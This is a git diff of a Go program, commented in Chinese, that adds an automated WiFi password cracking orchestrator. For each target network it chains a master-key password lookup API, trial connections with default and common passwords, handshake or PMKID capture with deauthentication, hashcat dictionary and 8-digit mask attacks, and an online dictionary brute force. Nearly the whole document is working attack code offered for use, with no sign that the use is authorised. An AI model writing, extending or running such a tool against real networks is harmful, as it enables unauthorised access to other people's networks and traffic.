@@ -119,6 +119,12 @@ func main() {
 			fmt.Println("\n  [!] 未选择任何目标")
 			return
 		}
+
+		// --all模式选择后 → 进入智能攻击编排器（自动分层递进）
+		if !*captureMode {
+			runSmartAttack(targets, *dictFile, *delay, *verbose)
+			return
+		}
 	} else if *target != "" {
 		fmt.Println("  [2/3] 查找指定目标...")
 		// 指定目标模式
@@ -645,4 +651,192 @@ func runHashcatOnly(hashFilePath, dictFilePath string, maskOnly, verbose bool) {
 		fmt.Printf("\n  [!] GPU破解未命中（%s）\n", result.Error)
 		os.Exit(1)
 	}
+}
+
+// ============================================================
+// runSmartAttack 智能攻击编排器
+// 选择WiFi后自动按效率从高到低依次尝试所有可用攻击手段
+//
+// 攻击流程（分层递进）：
+//   Phase 1（秒级）：万能钥匙API查询 → 命中则CoreWLAN验证连接
+//   Phase 2（秒级）：CoreWLAN快速验证TOP密码（路由器默认+TOP50高频）
+//   Phase 3（分钟级）：捕获握手包/PMKID → hashcat GPU字典攻击
+//   Phase 4（分钟~小时）：hashcat GPU掩码暴力攻击（8位数字→9位→...）
+//   Phase 5（兜底）：CoreWLAN在线完整字典爆破
+//
+// 工具协作逻辑：
+//   万能钥匙(API) → CoreWLAN(验证) → tcpdump(捕获) → bettercap(deauth)
+//   → hcxpcapngtool(转换) → hashcat(GPU破解) → CoreWLAN(兜底爆破)
+// ============================================================
+func runSmartAttack(targets []scanner.WiFiNetwork, dictFile string, delay int, verbose bool) {
+	start := time.Now()
+	fmt.Println("\n  ╔══════════════════════════════════════════════════╗")
+	fmt.Println("  ║        智能攻击编排器 (Smart Attack)              ║")
+	fmt.Println("  ║  万能钥匙 → 快速验证 → 握手捕获 → GPU破解 → 兜底 ║")
+	fmt.Println("  ╚══════════════════════════════════════════════════╝")
+
+	// 记录原始WiFi用于最后恢复
+	originalSSID := scanner.CurrentSSID()
+	if originalSSID != "" {
+		fmt.Printf("  [*] 当前WiFi: %s（完成后自动恢复）\n", originalSSID)
+	}
+
+	successCount := 0
+	for ti, t := range targets {
+		fmt.Printf("\n  ━━ 目标 [%d/%d] %s (BSSID:%s CH:%d %ddBm %s) ━━\n",
+			ti+1, len(targets), t.SSID, t.BSSID, t.Channel, t.RSSI, t.Security)
+
+		// ── Phase 1: 万能钥匙API查询（秒级） ──
+		fmt.Println("  [Phase 1] 万能钥匙API查询...")
+		if t.BSSID != "" {
+			pwd, err := masterkey.Query(t.SSID, t.BSSID)
+			if err == nil && pwd != "" {
+				fmt.Printf("    ✓ 万能钥匙命中: %s，验证连接...\n", pwd)
+				if scanner.TryConnect(t.SSID, pwd) {
+					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（万能钥匙）\n", t.SSID, pwd)
+					scanner.DisconnectWiFi()
+					successCount++
+					continue
+				}
+				fmt.Println("    ✗ 万能钥匙密码验证失败，继续下一阶段")
+			} else {
+				fmt.Println("    - 未收录")
+			}
+		} else {
+			fmt.Println("    - BSSID为空，跳过")
+		}
+
+		// ── Phase 2: CoreWLAN快速验证TOP密码（秒级） ──
+		fmt.Println("  [Phase 2] 快速验证TOP密码（路由器默认+高频密码）...")
+		topPasswords := buildTopPasswords(t.SSID)
+		found := false
+		for i, pwd := range topPasswords {
+			if verbose && i%10 == 0 {
+				fmt.Printf("\r    [%d/%d] 尝试中...", i+1, len(topPasswords))
+			}
+			if scanner.TryConnect(t.SSID, pwd) {
+				fmt.Printf("\r    ✓ 快速验证命中! 密码=%s（第%d次尝试）\n", pwd, i+1)
+				scanner.DisconnectWiFi()
+				successCount++
+				found = true
+				break
+			}
+			time.Sleep(100 * time.Millisecond)
+		}
+		if found {
+			continue
+		}
+		fmt.Printf("\r    - TOP %d个密码均未命中\n", len(topPasswords))
+
+		// ── Phase 3: 捕获握手包 + hashcat GPU字典攻击（分钟级） ──
+		// 检查是否有所需工具
+		missingTools := capture.CheckTools()
+		hasGPUTools := len(missingTools) == 0
+		hashcatOK, _ := hashcrack.CheckHashcat()
+
+		if hasGPUTools && hashcatOK {
+			fmt.Println("  [Phase 3] 握手包捕获 + GPU字典攻击...")
+			fmt.Println("    [!] 此阶段需要sudo权限，可能需要输入密码")
+
+			cfg := capture.DefaultCaptureConfig()
+			cfg.Verbose = verbose
+
+			capResult := capture.CaptureHandshake(t.SSID, t.BSSID, t.Channel, cfg)
+			if capResult.Success {
+				fmt.Printf("    ✓ 捕获成功（PMKID=%v, 握手=%v），启动GPU字典攻击...\n",
+					capResult.HasPMKID, capResult.HasHandshk)
+
+				// 生成字典文件
+				allPwds := allPasswordsForTargets([]scanner.WiFiNetwork{t}, dictFile)
+				wordlistPath, _ := hashcrack.GenerateWordlist(allPwds, cfg.OutputDir)
+
+				hcfg := hashcrack.DefaultHashcatConfig()
+				hcfg.HashFile = capResult.HashFile
+				hcfg.Verbose = verbose
+				if wordlistPath != "" {
+					hcfg.Wordlists = []string{wordlistPath}
+				}
+
+				hResult := hashcrack.CrackWithDict(hcfg)
+				if hResult.Success {
+					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（GPU字典攻击, %s）\n",
+						t.SSID, hResult.Password, hResult.Duration.Round(time.Second))
+					successCount++
+					continue
+				}
+				fmt.Println("    - GPU字典攻击未命中，进入掩码暴力阶段")
+
+				// ── Phase 4: hashcat GPU掩码暴力（分钟~小时级） ──
+				fmt.Println("  [Phase 4] GPU掩码暴力攻击（8位纯数字起步）...")
+				// 只尝试8位数字掩码（约32分钟），更长的掩码耗时太久
+				hcfg.MaskAttacks = []string{"?d?d?d?d?d?d?d?d"}
+				hcfg.Timeout = 40 * time.Minute
+				mResult := hashcrack.CrackWithMask(hcfg)
+				if mResult.Success {
+					fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（GPU掩码攻击, %s）\n",
+						t.SSID, mResult.Password, mResult.Duration.Round(time.Second))
+					successCount++
+					continue
+				}
+				fmt.Println("    - 8位纯数字掩码未命中")
+			} else {
+				fmt.Printf("    ✗ 握手包捕获失败: %s\n", capResult.Error)
+			}
+		} else {
+			if len(missingTools) > 0 {
+				fmt.Printf("  [Phase 3-4] 跳过GPU攻击（缺少工具: %s）\n", strings.Join(missingTools, ", "))
+			}
+		}
+
+		// ── Phase 5: CoreWLAN在线完整字典爆破（兜底） ──
+		fmt.Println("  [Phase 5] CoreWLAN在线完整字典爆破（兜底方案）...")
+		allPwds := allPasswordsForTargets([]scanner.WiFiNetwork{t}, dictFile)
+		crackCfg := cracker.CrackConfig{
+			Delay:    time.Duration(delay) * time.Millisecond,
+			Verbose:  verbose,
+			MaxRetry: 1,
+		}
+		scanner.CacheTarget(t.SSID)
+		result := cracker.CrackOne(t, allPwds, crackCfg)
+		if result.Success {
+			successCount++
+		}
+	}
+
+	// 恢复原始WiFi
+	if originalSSID != "" {
+		fmt.Printf("\n  [*] 正在恢复原WiFi: %s ...", originalSSID)
+		if scanner.ReconnectWiFi(originalSSID) {
+			fmt.Println(" ✓ 已恢复")
+		} else {
+			fmt.Println(" ✗ 恢复失败，请手动连接")
+		}
+	}
+
+	elapsed := time.Since(start).Round(time.Second)
+	fmt.Printf("\n  ━━ 智能攻击完成: %d个目标, 成功%d个, 总耗时%s ━━\n",
+		len(targets), successCount, elapsed)
+
+	if successCount > 0 {
+		os.Exit(0)
+	} else {
+		os.Exit(1)
+	}
+}
+
+// ============================================================
+// buildTopPasswords 构建快速验证用的TOP密码列表
+// 包含：路由器默认密码 + 前50个最高频密码（约50-70条，10秒内可完成）
+// ============================================================
+func buildTopPasswords(ssid string) []string {
+	var top []string
+	// 路由器默认密码（根据SSID特征生成）
+	top = append(top, cracker.GenerateRouterDefaults(ssid)...)
+	// 最高频的50个密码
+	topN := dict.TopPasswords
+	if len(topN) > 50 {
+		topN = topN[:50]
+	}
+	top = append(top, topN...)
+	return dict.MergeAndDedup(top)
 }
